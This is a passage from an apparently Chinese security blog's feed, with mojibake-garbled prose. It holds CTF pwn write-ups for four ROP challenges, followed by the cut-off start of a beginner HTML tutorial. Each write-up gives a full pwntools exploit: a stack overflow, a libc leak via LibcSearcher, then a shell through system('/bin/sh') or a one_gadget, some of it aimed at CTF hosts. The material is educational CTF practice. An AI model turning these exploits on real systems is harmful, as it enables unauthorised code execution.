title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h2><h3 id="æŸ¥ä¿æŠ¤å’Œarch-3"><a href="#æŸ¥ä¿æŠ¤å’Œarch-3" class="headerlink" title="æŸ¥ä¿æŠ¤å’Œarch"></a>æŸ¥ä¿æŠ¤å’Œarch</h3><p><img src="/2020/02/03/ROPç»ƒä¹ /images/15808195388315.jpg" srcset="/img/loading.gif" alt="-w408"></p><h3 id="idaåˆ†æ-3"><a href="#idaåˆ†æ-3" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p><img src="/2020/02/03/ROPç»ƒä¹ /images/15808195745508.jpg" srcset="/img/loading.gif" alt="-w436"><br>å‡½æ•°ååˆ†ç®€å•ï¼Œæ˜æ˜¾æ ˆæº¢å‡ºï¼Œæ€è·¯å°±æ˜¯å…ˆæ ˆæº¢å‡ºæ„é€ ropé“¾ï¼Œè®©putså‡½æ•°æ‰“å°å‡º<code>__libc_start_main</code>å‡½æ•°çš„åœ°å€ï¼Œç„¶åå†ç”¨libcsearcheræ¥è·å–ä¸€ä¸‹å®ƒçš„libcç‰ˆæœ¬ï¼Œç„¶åå†è®¡ç®—å‡ºå®ƒçš„åŸºå€ï¼Œå†è®©å‡½æ•°è¿”å›åˆ°æœ€åˆæ¸…ç†ä¸€ä¸‹æ ˆï¼Œç„¶åå†æ¬¡è¿›è¡Œæº¢å‡ºæ„é€ å…³äº<code>system(&#39;/bin/sh&#39;)</code>çš„ropé“¾å³å¯ã€‚</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *from LibcSearcher import *import time# context.log_level = &#39;debug&#39;io = remote(&#39;node3.buuoj.cn&#39;,28661)# io = process(&#39;./bjdctf_2020_babyrop&#39;)elf = ELF(&#39;./bjdctf_2020_babyrop&#39;)# blibc = ELF(&#39;/lib/x86_64-linux-gnu/libc-2.23.so&#39;)io.recvuntil(&#39;story!\n&#39;)padding = 40libc_main_add = elf.got[&#39;__libc_start_main&#39;]puts_add = elf.symbols[&#39;puts&#39;]pop_rdi_ret = 0x0400733 p = &#39;a&#39;*padding + p64(pop_rdi_ret) + p64(libc_main_add) + p64(puts_add) + p64(0x400530)io.sendline(p)s = u64(io.recv(6).ljust(8,&#39;\x00&#39;))print(hex(s))obj = LibcSearcher(&quot;__libc_start_main&quot;,s)libc_base = s - obj.dump(&quot;__libc_start_main&quot;)system_add = libc_base + obj.dump(&quot;system&quot;)binsh_add = libc_base + obj.dump(&quot;str_bin_sh&quot;)sleep(1)io.recvuntil(&#39;story!\n&#39;)p = &#39;a&#39;*padding + p64(pop_rdi_ret) + p64(binsh_add) + p64(system_add)io.sendline(p)io.interactive()</code></pre><h2 id="unctf-easyrop"><a href="#unctf-easyrop" class="headerlink" title="unctf_easyrop"></a>unctf_easyrop</h2><h3 id="æŸ¥ä¿æŠ¤å’Œarch-4"><a href="#æŸ¥ä¿æŠ¤å’Œarch-4" class="headerlink" title="æŸ¥ä¿æŠ¤å’Œarch"></a>æŸ¥ä¿æŠ¤å’Œarch</h3><p><img src="/2020/02/03/ROPç»ƒä¹ /images/15808809043718.jpg" srcset="/img/loading.gif" alt="-w432"></p><h3 id="idaåˆ†æ-4"><a href="#idaåˆ†æ-4" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p><img src="/2020/02/03/ROPç»ƒä¹ /images/15808809641958.jpg" srcset="/img/loading.gif" alt="-w397"><br>ä¸»ç¨‹åºä¸»è¦å°±æ˜¯é™åˆ¶äº†v2éœ€è¦ç­‰äº<code>ffff</code>æ‰èƒ½è¿›å…¥å¸¦æœ‰æº¢å‡ºçš„å‡½æ•°ï¼Œv2çš„å€¼æ˜¯<br><img src="/2020/02/03/ROPç»ƒä¹ /images/15808810282809.jpg" srcset="/img/loading.gif" alt="-w381"><br>è¿™ä¸ªåœ¨readçš„æ—¶å€™æŠŠæ§å¥½ï¼Œè®©ffffå¡«å…¥è¿™ä¸ªä½ç½®å³å¯ã€‚<br><img src="/2020/02/03/ROPç»ƒä¹ /images/15808811265759.jpg" srcset="/img/loading.gif" alt="-w407"><br>ç„¶åè¿›å…¥è¿™ä¸ªå¸¦æœ‰æº¢å‡ºæ¼æ´çš„å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°bufçš„é¦–åœ°å€æ˜¯<code>ebp-0x10</code>ï¼Œ<img src="/2020/02/03/ROPç»ƒä¹ /images/15808812877029.jpg" srcset="/img/loading.gif" alt="-w478"><br>ç„¶ååˆ†æä¸‹è¿™é‡Œçš„æ±‡ç¼–ï¼Œå®ƒæŠŠreadå‡½æ•°çš„æº¢å‡ºä½ç½®è¿”å›å€¼<code>ebp-0x14</code>å–å‡ºæ¥ï¼Œä¸<code>0x8050000</code>è¿›è¡Œæ¯”è¾ƒã€‚<br><img src="/2020/02/03/ROPç»ƒä¹ /images/15808814707476.jpg" srcset="/img/loading.gif" alt="-w385"><br>ä¹Ÿå¯ä»¥çœ‹å‡ºï¼Œè¿™é‡Œæ˜¯é˜²æ­¢æˆ‘ä»¬è¿›è¡Œret2libcçš„ã€‚é‚£æˆ‘ä»¬æ„é€ è¿™é‡Œå¯ä»¥ç”¨ä¸€ä¸ªretæ¥è¿›è¡Œç»•è¿‡ã€‚</p><h4 id="æ€è·¯æ€»ç»“"><a href="#æ€è·¯æ€»ç»“" class="headerlink" title="æ€è·¯æ€»ç»“"></a>æ€è·¯æ€»ç»“</h4><p>å…ˆæ§åˆ¶å¥½v2è®©å…¶ç­‰äº<code>ffff</code>ï¼Œç„¶åè¿›å…¥å¸¦æœ‰æº¢å‡ºçš„å‡½æ•°ï¼Œç„¶åæ„é€ ropé“¾ï¼Œå…ˆæŠŠ<code>__libc_start_main</code>çš„å†…å­˜åœ°å€æ³„éœ²å‡ºæ¥ï¼Œç„¶åç”¨libcseacheræ¥ç¡®å®šlibcç‰ˆæœ¬ï¼Œ<br>ç„¶ådumpå‡º<code>__libc_start_mainçš„sympols</code>,ç®—å‡ºåŸºå€åï¼Œæ¥ç€è¿”å›åˆ°å¼€å§‹å¤„æ¸…ç†ä¸€ä¸‹æ ˆï¼Œå†æ¬¡æº¢å‡ºè·ŸåŸæ¥ä¸€æ ·ã€‚ç„¶åå†æ¬¡æ„é€ ropé“¾çš„æ—¶å€™ï¼Œæ³¨æ„retç»•è¿‡å¯¹å’±ä»¬æº¢å‡ºåœ°å€çš„æ£€æµ‹ï¼Œåœ¨è°ƒç”¨system(â€˜/bin/shâ€™)å³å¯ã€‚</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *from LibcSearcher import *import time# context.log_level = &#39;debug&#39;io = process(&#39;./easyrop&#39;)# io = remote(&#39;183.129.189.60&#39;,10011)io.recvuntil(&#39;TFer!\n&#39;)e =ELF(&#39;./easyrop&#39;)raw_input(&#39;-&gt;&#39;)padding = 36start_add = 0x08048400libc_start_main = e.got[&#39;__libc_start_main&#39;]puts_add = e.symbols[&#39;puts&#39;]ret = 0x0804839ep = &#39;f&#39; * paddingrop1 = [    puts_add,    start_add,    libc_start_main]io.sendline(p)io.recvuntil(&#39;name?\n&#39;)p = &#39;\x00&#39; * 0x18 + &#39;&#39;.join(map(p32,rop1))raw_input(&#39;&gt;&#39;)io.sendline(p)libc_start_add = u32(io.recv(4))obj = LibcSearcher(&quot;__libc_start_main&quot;,libc_start_add)libc_base = libc_start_add - obj.dump(&quot;__libc_start_main&quot;)print(libc_base)system_add = obj.dump(&#39;system&#39;) + libc_basebinsh_add = obj.dump(&#39;str_bin_sh&#39;) + libc_baseio.recvuntil(&#39;TFer!\n&#39;)p = &#39;f&#39; * paddingio.sendline(p)io.recvuntil(&#39;name?\n&#39;)rop2 = [    ret,    system_add,    start_add,    binsh_add]p = &#39;\x00&#39; * 0x14 + &#39;&#39;.join(map(p32,rop2))sleep(1)io.sendline(p)io.interactive()</code></pre><h2 id="é“äººä¸‰é¡¹-ç¬¬äº”èµ›åŒº-2018-rop"><a href="#é“äººä¸‰é¡¹-ç¬¬äº”èµ›åŒº-2018-rop" class="headerlink" title="é“äººä¸‰é¡¹(ç¬¬äº”èµ›åŒº)_2018_rop"></a>é“äººä¸‰é¡¹(ç¬¬äº”èµ›åŒº)_2018_rop</h2><h3 id="æŸ¥ä¿æŠ¤å’Œarch-5"><a href="#æŸ¥ä¿æŠ¤å’Œarch-5" class="headerlink" title="æŸ¥ä¿æŠ¤å’Œarch"></a>æŸ¥ä¿æŠ¤å’Œarch</h3><p><img src="/2020/02/03/ROPç»ƒä¹ /images/15813386440906.jpg" srcset="/img/loading.gif" alt="-w512"><br>32ä½</p><h3 id="idaåˆ†æ-5"><a href="#idaåˆ†æ-5" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><pre><code>int __cdecl main(int argc, const char **argv, const char **envp){  be_nice_to_people();  vulnerable_function();  return write(1, &quot;Hello, World\n&quot;, 0xDu);}</code></pre><p>ä¸»å‡½æ•°å¾ˆç®€å•ï¼Œæ¼æ´å‡½æ•°æ˜¯åœ¨ç¬¬äºŒä¸ªå‡½æ•°ã€‚<br><img src="/2020/02/03/ROPç»ƒä¹ /images/15813387437739.jpg" srcset="/img/loading.gif" alt="-w344"><br>æ ˆæº¢å‡ºï¼Œç„¶åç›´æ¥æ„é€ ropé“¾å³å¯ã€‚<br><img src="/2020/02/03/ROPç»ƒä¹ /images/15813388677907.jpg" srcset="/img/loading.gif" alt="-w322"><br>åˆ©ç”¨æ€è·¯ï¼šç”¨wirteå‡½æ•°æ³„éœ²å‡º<code>__libc_start_main</code>åœ¨å†…å­˜åœ°å€ï¼Œç„¶åè¿”å›startæ¸…ç†ä¸€ä¸‹æ ˆï¼Œç”¨libcseacherç¡®å®šä¸‹libcç‰ˆæœ¬ï¼Œç„¶åè¿›è¡Œæ„é€ system(â€˜/bin/shâ€™)çš„ropé“¾å³å¯ã€‚</p><p>è¿™ä¸ªæˆ‘æ˜¯å‘ç°å¯ä»¥ç”¨libcseacherç¡®å®šlibcç‰ˆæœ¬åï¼Œç”¨one_gadgetå·¥å…·è®¡ç®—RCEä½ç½®ï¼Œç„¶åå®ç°ret to RCEã€‚libcseacherè·å–åˆ°leakåœ°å€åï¼Œåœ¨æ‰§è¡Œdump libcå‰çš„æ—¶å€™ï¼Œä¼šå‘Šè¯‰ä½ ï¼Œå®ƒç¡®å®šçš„libcç‰ˆæœ¬å·æ˜¯å¤šå°‘ã€‚<br><img src="/2020/02/03/ROPç»ƒä¹ /images/15813393524855.jpg" srcset="/img/loading.gif" alt="-w1217"><br>è¿™ä¸ªæ˜¯è®©ä½ é€‰æ‹©çš„ã€‚<br><img src="/2020/02/03/ROPç»ƒä¹ /images/15813394033522.jpg" srcset="/img/loading.gif" alt="-w826"></p><p><img src="/2020/02/03/ROPç»ƒä¹ /images/15813392212443.jpg" srcset="/img/loading.gif" alt="-w1200"><br>åœ¨ä¸‹è½½çš„libcseacheræ—¶å€™ï¼Œå…¶å®å®ƒæ˜¯æœ‰ä¸ªæ•°æ®åº“çš„ï¼Œè¿™é‡Œé¢å­˜ç€å„ç§libcç‰ˆæœ¬ï¼Œæ–¹ä¾¿å’±ä»¬ä½¿ç”¨ã€‚é‚£è¿™ä¸ªæ—¶å€™ï¼Œç›´æ¥ç”¨one_gadget è®¡ç®—ä¸‹RCEåç§»å³å¯ã€‚<br><img src="/2020/02/03/ROPç»ƒä¹ /images/15813395195579.jpg" srcset="/img/loading.gif" alt="-w1030"></p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *from LibcSearcher import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;elf = ELF(&#39;./2018_rop&#39;)# io = process(&#39;./2018_rop&#39;)io = remote(&#39;node3.buuoj.cn&#39;,29692)padding = 140 write_plt = elf.symbols[&#39;write&#39;]libc_start_main_got = elf.got[&#39;__libc_start_main&#39;]start = 0x080483C0 p = padding * &#39;\x00&#39; + flat([write_plt,start,1,libc_start_main_got,0x10])# raw_input(&#39;-&gt;&#39;)io.sendline(p)libc_start_main_add = u32(io.recv(4))obj = LibcSearcher(&#39;__libc_start_main&#39;,libc_start_main_add)libc_base = libc_start_main_add - obj.dump(&#39;__libc_start_main&#39;)system_add = libc_base + obj.dump(&#39;system&#39;)binsh_add = libc_base + obj.dump(&#39;str_bin_sh&#39;)# print(libc.symbols[&#39;__libc_start_main&#39;])print(hex(libc_base))# io.recvline()RCE = libc_base + 0x3cbecp = padding * &#39;\x00&#39; + p32(RCE) + padding * &#39;\x00&#39;# p = padding * &#39;\x00&#39; + p32(system_add) + p32(start) + p32(binsh_add)io.sendline(p)io.interactive()</code></pre><p>è¿™é‡Œé¢ä¸¤ç§åŠæ³•éƒ½è¡Œã€‚</p><h2 id="xdctf2015-pwn200"><a href="#xdctf2015-pwn200" class="headerlink" title="xdctf2015_pwn200"></a>xdctf2015_pwn200</h2><h3 id="æŸ¥ä¿æŠ¤å’Œarch-6"><a href="#æŸ¥ä¿æŠ¤å’Œarch-6" class="headerlink" title="æŸ¥ä¿æŠ¤å’Œarch"></a>æŸ¥ä¿æŠ¤å’Œarch</h3><pre><code> Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h3 id="idaåˆ†æ-6"><a href="#idaåˆ†æ-6" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p><img src="/2020/02/03/ROPç»ƒä¹ /images/15814340991655.jpg" srcset="/img/loading.gif" alt="-w601"><br>ä¸»å‡½æ•°ååˆ†ç®€å•ï¼Œæ¼æ´åœ¨vulnå‡½æ•°ï¼š<br><img src="/2020/02/03/ROPç»ƒä¹ /images/15814341281175.jpg" srcset="/img/loading.gif" alt="-w389"><br>paddingä¸º 6c+4 ä¸ªå­—èŠ‚ã€‚è·Ÿä¸Šé¢˜å¾ˆåƒçš„æ”»å‡»æ€è·¯ï¼Œç›´æ¥ç»™expäº†ã€‚</p><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *from LibcSearcher import *# io = process(&#39;./bof&#39;)io = remote(&#39;node3.buuoj.cn&#39;,27178)elf = ELF(&#39;./bof&#39;)libc = elf.libccontext.arch = &#39;i386&#39;context.log_level = &#39;debug&#39;padding = 112start_add = 0x080483E0libc_start_main_got = elf.got[&#39;__libc_start_main&#39;]write_plt = elf.symbols[&#39;write&#39;]io.recvuntil(&#39;2015~!\n&#39;)p = padding * &#39;\x00&#39; + flat([write_plt,start_add,1,libc_start_main_got,0x10])io.sendline(p)libc_start_main_add = u32(io.recv(4))obj = LibcSearcher(&#39;__libc_start_main&#39;,libc_start_main_add)libc_base = libc_start_main_add - obj.dump(&#39;__libc_start_main&#39;)print(hex(libc_start_main_add))print(hex(libc_base))io.recvuntil(&#39;2015~!\n&#39;)rce = libc_base + 0x3a80cp = padding * &#39;\x00&#39; + p32(rce) + padding * &#39;\x00&#39;io.sendline(p)io.interactive()</code></pre><p>è¿˜æ˜¯æœ¬åœ°æ¥baseåº“æŸ¥libcçš„one_gadgetï¼Œç„¶året to rceã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>ROP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTML åŸºç¡€</title>
    <link href="/2019/12/29/HTML%20%E5%9F%BA%E7%A1%80/"/>
    <url>/2019/12/29/HTML%20%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h2 id="HTML-åŸºç¡€"><a href="#HTML-åŸºç¡€" class="headerlink" title="HTML åŸºç¡€"></a>HTML åŸºç¡€</h2><ol><li><strong>HTMLæ ‡é¢˜</strong>ï¼šæ˜¯é€šè¿‡ <code>&lt;h1&gt; - &lt;h6&gt;</code> æ ‡ç­¾æ¥å®šä¹‰çš„.ï¼›å…¶ä¼šå› ä¸ºæ•°å­—å˜åŒ–è€Œæ˜¾ç¤ºçš„å­—ä½“å¤§å°å˜åŒ–ï¼›</li><li><strong>HTMLæ®µè½</strong>ï¼šé€šè¿‡æ ‡ç­¾<code>&lt;p&gt;</code> æ¥å®šä¹‰çš„.</li><li><strong>HTMLé“¾æ¥</strong>ï¼šé€šè¿‡æ ‡ç­¾<code>&lt;a&gt;</code>æ¥å®šä¹‰çš„ã€‚</li><li><strong>HTMLå›¾åƒ</strong>ï¼šé€šè¿‡æ ‡ç­¾ <code>&lt;img&gt;</code> æ¥å®šä¹‰çš„ã€‚</li></ol><h2 id="HTML-æ–‡æœ¬"><a href="#HTML-æ–‡æœ¬" class="headerlink" title="HTML æ–‡æœ¬"></a>HTML æ–‡æœ¬</h2><h4 id="HTML-æ ‡é¢˜"><a href="#HTML-æ ‡é¢˜" class="headerlink" title="HTML æ ‡é¢˜"></a>HTML æ ‡é¢˜</h4><p>æ ‡é¢˜ï¼ˆHeadingï¼‰æ˜¯é€šè¿‡<code>&lt;h1&gt; - &lt;h6&gt;</code> æ ‡ç­¾è¿›è¡Œå®šä¹‰çš„.<code>&lt;h1&gt;</code> å®šä¹‰æœ€å¤§çš„æ ‡é¢˜ã€‚ <code>&lt;h6&gt;</code>å®šä¹‰æœ€å°çš„æ ‡é¢˜ã€‚<strong>æµè§ˆå™¨ä¼šè‡ªåŠ¨åœ°åœ¨æ ‡é¢˜çš„å‰åæ·»åŠ ç©ºè¡Œã€‚</strong></p><ul><li><p>æ ‡é¢˜å¾ˆé‡è¦ï¼š</p><p>ä¸è¦ä»…ä»…æ˜¯ä¸ºäº†ç”Ÿæˆ<strong>ç²—ä½“</strong>æˆ–<strong>å¤§å·</strong>çš„æ–‡æœ¬è€Œä½¿ç”¨æ ‡é¢˜ï¼Œè€Œæ˜¯==ä¸ºäº†ç”¨æˆ·å¯ä»¥é€šè¿‡æ ‡é¢˜æ¥å¿«é€Ÿæµè§ˆæ‚¨çš„ç½‘é¡µåº”è¯¥å°† h1 ç”¨ä½œä¸»æ ‡é¢˜==ï¼ˆæœ€é‡è¦çš„ï¼‰ï¼Œå…¶åæ˜¯ h2ï¼ˆæ¬¡é‡è¦çš„ï¼‰ï¼Œå†å…¶æ¬¡æ˜¯ h3ï¼Œä»¥æ­¤ç±»æ¨ã€‚</p></li></ul><h4 id="HTML-æ³¨é‡Š"><a href="#HTML-æ³¨é‡Š" class="headerlink" title="HTML æ³¨é‡Š"></a>HTML æ³¨é‡Š</h4><p><strong>æ³¨é‡Š</strong>ï¼š å¼€å§‹æ‹¬å·ä¹‹åï¼ˆå·¦è¾¹çš„æ‹¬å·ï¼‰éœ€è¦ç´§è·Ÿä¸€ä¸ªå¹å·ï¼Œç»“æŸæ‹¬å·ä¹‹å‰ï¼ˆå³è¾¹çš„æ‹¬å·ï¼‰ä¸éœ€è¦ï¼Œåˆç†åœ°ä½¿ç”¨æ³¨é‡Šå¯ä»¥å¯¹æœªæ¥çš„ä»£ç ç¼–è¾‘å·¥ä½œäº§ç”Ÿå¸®åŠ©ã€‚ã€‚</p><pre><code class="html">&lt;!-- è¿™æ˜¯ä¸€ä¸ªæ³¨é‡Š --&gt;</code></pre><h4 id="HTML-æ®µè½"><a href="#HTML-æ®µè½" class="headerlink" title="HTML æ®µè½"></a>HTML æ®µè½</h4><p>æµè§ˆå™¨ä¼šè‡ªåŠ¨åœ°åœ¨æ®µè½çš„å‰åæ·»åŠ ç©ºè¡Œã€‚<strong>ï¼ˆ<code>&lt;/p&gt;</code>æ˜¯å—çº§å…ƒç´ ï¼‰</strong></p><h4 id="HTML-æ°´å¹³çº¿"><a href="#HTML-æ°´å¹³çº¿" class="headerlink" title="HTML æ°´å¹³çº¿"></a>HTML æ°´å¹³çº¿</h4><p>1ï¼š<code>&lt;hr&gt;</code>æ ‡ç­¾åœ¨ HTML é¡µé¢ä¸­åˆ›å»ºæ°´å¹³çº¿ã€‚</p><h4 id="HTML-æ–‡æœ¬æ ¼å¼åŒ–"><a href="#HTML-æ–‡æœ¬æ ¼å¼åŒ–" class="headerlink" title="HTML æ–‡æœ¬æ ¼å¼åŒ–"></a>HTML æ–‡æœ¬æ ¼å¼åŒ–</h4><p>é€šå¸¸ç”¨åˆ°<code>&lt;strong&gt;&lt;em&gt;&lt;del&gt;</code>è¿™å‡ ä¸ªæ ‡ç­¾ã€‚</p><h4 id="ç»ƒä¹ ï¼š"><a href="#ç»ƒä¹ ï¼š" class="headerlink" title="ç»ƒä¹ ï¼š"></a>ç»ƒä¹ ï¼š</h4><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;æ–‡æœ¬&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;!-- &lt;h1&gt;æ ‡é¢˜1&lt;/h1&gt;    &lt;h2&gt;æ ‡é¢˜2&lt;/h2&gt;    &lt;h3&gt;æ ‡é¢˜3&lt;/h3&gt;    &lt;h4&gt;æ ‡é¢˜4&lt;/h4&gt;    &lt;h5&gt;æ ‡é¢˜5&lt;/h5&gt;    &lt;h6&gt;æ ‡é¢˜6&lt;/h6&gt; --&gt;    &lt;!-- &lt;h&gt;æ ‡ç­¾æœ‰å¤§å°ä¹‹åˆ† --&gt;        &lt;h2&gt;äº”èŠ±å±±&lt;/h2&gt;        &lt;p&gt;æˆ‘å®¶ä½åœ¨å¤§å±±é‡Œã€‚ä½ çŸ¥é“è¿™é‡Œçš„å±±æ˜¯ä»€ä¹ˆé¢œè‰²çš„å—ï¼Ÿ&lt;/p&gt;        &lt;p&gt;æ˜¥å¤©çš„å±±æ˜¯ç»¿è‰²çš„ï¼Œé‚£ç»¿è‰²æ·¡æ·¡çš„ï¼Œè®¸å¤šæ ‘å¶åˆšå†’å‡ºèŠ½æ¥ï¼Œè¿˜å¸¦ç€å«©å«©çš„é»„è‰²å‘¢ã€‚&lt;/p&gt;        &lt;p&gt;å¤å¤©çš„å±±ä¹Ÿæ˜¯ç»¿è‰²çš„ï¼Œé‚£ç»¿è‰²æµ“æµ“çš„ï¼Œä¸€ç‰‡ç‰‡æ ‘å¶ï¼Œä¸ç®¡æ˜¯å¤§çš„è¿˜æ˜¯å°çš„ï¼Œéƒ½åƒè¢«ç»¿æ²¹å½©æ¶‚è¿‡ï¼Œè¿é›¨ç‚¹è½ä¸Šå»ï¼Œéƒ½ç»™æŸ“ç»¿äº†ã€‚&lt;/p&gt;        &lt;p&gt;ç§‹å¤©çš„å±±ä¸å†æ˜¯ä¸€ç§é¢œè‰²äº†ã€‚ä¸‹è¿‡ä¸€åœºç§‹éœœæœ‰çš„æ ‘æ—å˜æˆäº†é‡‘é»„è‰²â–¡å¥½åƒæ‰€æœ‰çš„é˜³å…‰éƒ½é›†ä¸­åˆ°é‚£å„¿å»äº†æœ‰çš„æ ‘æ—å˜æˆäº†æé»„è‰²è¿œè¿œæœ›å»ï¼Œå°±åƒæå¤´æŒ‚æ»¡äº†ç†Ÿé€çš„æå’Œæ¢¨ï¼›æœ‰çš„æ ‘æ—å˜æˆäº†ç«çº¢è‰²ï¼Œé£ä¸€å¹ï¼Œæ ‘æ—è·³èµ·èˆæ¥ï¼Œå°±åƒä¸€ç°‡ç°‡ç«è‹—åœ¨è·³è·ƒï¼›è¿˜æœ‰çš„æ ‘æ—å˜å¾—ç´«çº¢ç´«çº¢ï¼Œè·Ÿå‰§åœºé‡Œçš„ç´«ç»’å¹•å¸ƒçš„é¢œè‰²ä¸€æ ·ã€‚åªæœ‰æ¾æŸä¸æ€•ç§‹éœœï¼Œé’ˆä¸€æ ·çš„å¶å­è¿˜æ˜¯é‚£ä¹ˆç¿ ç»¿ã€‚&lt;/p&gt;        &lt;p&gt;ç§‹å¤©çš„å±±ä¸€ç‰‡é‡‘é»„ï¼Œä¸€ç‰‡ç«çº¢ï¼Œä¸€ç‰‡ç¿ ç»¿â€¦â€¦äººä»¬ç»™è¿™äº”é¢œå…­è‰²çš„å±±èµ·äº†ä¸ªå¥½å¬çš„åå­—ï¼Œå«â€œ&lt;strong&gt;&lt;em&gt; &lt;del&gt;äº”èŠ±å±±&lt;/del&gt;&lt;/em&gt;&lt;/strong&gt;â€ã€‚&lt;/p&gt;  &lt;!-- å‡ ä¸ªæ ‡ç­¾çš„åµŒå¥— --&gt;         &lt;strong&gt;åŠ ç²—&lt;/strong&gt; &lt;em&gt;æ–œä½“&lt;/em&gt; &lt;del&gt;åˆ é™¤æ–‡å­—&lt;/del&gt;&lt;!-- &lt;span&gt;é…åˆcss&lt;/span&gt; --&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>æ•ˆæœï¼š</p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/wenben.jpg?raw=true" srcset="/img/loading.gif" alt></p><h2 id="HTML-å›¾åƒ"><a href="#HTML-å›¾åƒ" class="headerlink" title="HTML å›¾åƒ"></a>HTML å›¾åƒ</h2><p> ==<strong>HTML å›¾åƒ-</strong>== ï¼š</p><ol><li>æ ‡ç­¾ï¼ˆ <code>&lt;img&gt;</code>ï¼‰æ˜¯ç©ºæ ‡ç­¾ï¼Œæ„æ€æ˜¯è¯´ï¼Œå®ƒåªåŒ…å«å±æ€§ï¼Œå¹¶ä¸”æ²¡æœ‰é—­åˆæ ‡ç­¾ã€‚</li><li>æºå±æ€§ï¼ˆ<code>&lt;src&gt;</code>ï¼‰æ˜¯å›¾åƒçš„ URL åœ°å€ã€‚åˆ†ä¸ºæœ¬åœ°å’Œç½‘ä¸Šï¼Œæœ¬åœ°å›¾ç‰‡å†™è·¯å¾„çš„æ—¶å€™æ³¨æ„<strong>ç»å¯¹è·¯å¾„å’Œç›¸å¯¹è·¯å¾„</strong>ï¼ˆå¯ä»¥ç”¨<code>../</code>æ¥è¿”å› ä¸€çº§ç›®å½•ï¼Œè¿”å›å‡ çº§ç›®å½•å°±å†™å‡ ä¸ªå®ƒå°±è¡Œ)ã€‚</li><li>Altå±æ€§:alt å±æ€§ç”¨æ¥ä¸ºå›¾åƒå®šä¹‰ä¸€ä¸²é¢„å¤‡çš„å¯æ›¿æ¢çš„æ–‡æœ¬,åœ¨æµè§ˆå™¨æ— æ³•è½½å…¥å›¾åƒæ—¶,å‘Šç”¨æˆ·å›¾ç‰‡çš„ä¿¡æ¯ã€‚<strong>==æœç´¢å¼•æ“ä¹Ÿæ˜¯é€šè¿‡æ­¤æè¿°æ¥æ”¶é›†å›¾ç‰‡çš„==</strong>.</li><li>é«˜åº¦ä¸å®½åº¦:heightï¼ˆé«˜åº¦ï¼‰ ä¸ widthï¼ˆå®½åº¦ï¼‰å±æ€§ç”¨äºè®¾ç½®å›¾åƒçš„é«˜åº¦ä¸å®½åº¦ã€‚å±æ€§å€¼é»˜è®¤å•ä½ä¸ºåƒç´ pxã€‚</li></ol><p>ç»ƒä¹ ï¼š</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;å›¾ç‰‡&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;img src=&quot;1.png&quot; alt=&quot;chumençš„qqå›¾åƒ&quot; title=&quot;chumençš„qqå›¾åƒ&quot;&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h4 id="å›¾ç‰‡çš„æ˜ å°„"><a href="#å›¾ç‰‡çš„æ˜ å°„" class="headerlink" title="å›¾ç‰‡çš„æ˜ å°„"></a>å›¾ç‰‡çš„æ˜ å°„</h4><p>ç›®æ ‡æ˜¯ä¸ºäº†åœ¨ä¸€å¼ å›¾ç‰‡ä¸Šçš„<strong>æŸä¸ªä½ç½®</strong>ç‚¹å‡»å<strong>æ‰</strong>å¯ä»¥å®ç°æŸä¸ªåŠŸèƒ½ã€‚</p><p>è¿™éœ€è¦ç”¨åˆ°<code>usemap=&quot;#diyname&quot;</code> ç„¶åç”¨<code>&lt;map name=&quot;diyname&quot;&gt;&lt;/map&gt;</code>æ ‡ç­¾æ¥å¯¹åº”ã€‚</p><p>æ ¸å¿ƒä»£ç ï¼š`<map name="1map"></map></p><pre><code>    &lt;area shape=&quot;&quot; coords=&quot;&quot; href=&quot;&quot;&gt;</code></pre><p>\\`</p><p>shapeæ˜¯é€‰æ‹©çš„å½¢çŠ¶ï¼Œcoordsæ˜¯åæ ‡ï¼Œåæ ‡ç¡®å®š<strong>æ¨èç”¨qqçš„æˆªå›¾åŠŸèƒ½é‚£é‡Œæ¥ç¡®å®š</strong>ï¼Œæ¯”å¦‚ï¼š</p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/quzuobiao.jpg?raw=true" srcset="/img/loading.gif" alt></p><p>é‚£è¿™ä¸ªå½©è‰²ç®­å¤´æŒ‡çš„ä½ç½®å°±æ˜¯åœ¨è¿™ä¸ªå›¾åƒçš„ï¼ˆ233,456ï¼‰ä½ç½®ã€‚</p><p><strong>ç»ƒä¹ ï¼š</strong></p><pre><code class="HTML">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;å›¾ç‰‡çš„æ˜ å°„&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;img src=&quot;1.png&quot; alt=&quot;&quot; usemap=&quot;#1map&quot;&gt;    &lt;map name=&quot;1map&quot;&gt;        &lt;area shape=&quot;circle&quot; coords=&quot;300,255,50&quot; target=&quot;_blank&quot; href=&quot;http://www.baidu.com&quot;&gt;    